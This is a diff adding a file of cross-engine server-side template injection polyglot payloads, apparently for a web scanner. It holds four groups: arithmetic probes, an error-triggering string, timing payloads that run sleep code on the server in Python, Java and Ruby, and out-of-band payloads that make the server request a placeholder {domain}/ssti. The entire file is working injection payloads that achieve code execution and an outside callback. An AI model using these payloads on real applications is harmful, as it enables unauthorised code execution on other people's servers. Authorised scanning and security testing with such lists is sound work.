@@ -1,0 +1,8 @@
+##POLYGLOT - SSTI Cross-Engine (Math: 1337)##
+{{7*191}}${7*191}<%= 7*191 %>${{7*191}}#{7*191}#set($x=7*191)$x[=7*191]@(7*191)
+##POLYGLOT - SSTI Cross-Engine (Error)##
+${{<%[%'"}}%\
+##POLYGLOT - SSTI Cross-Engine (Timing)##
+{{__import__('time').sleep(5)}}${T(java.lang.Thread).sleep(5000)}<%= sleep(5) %>${{T(java.lang.Thread).sleep(5000)}}
+##POLYGLOT - SSTI Cross-Engine (OOB)##
+{{__import__('urllib.request').request.urlopen('http://{domain}/ssti')}}${T(java.net.URL).new('http://{domain}/ssti').openStream()}<%= require('net/http');Net::HTTP.get(URI('http://{domain}/ssti')) %>
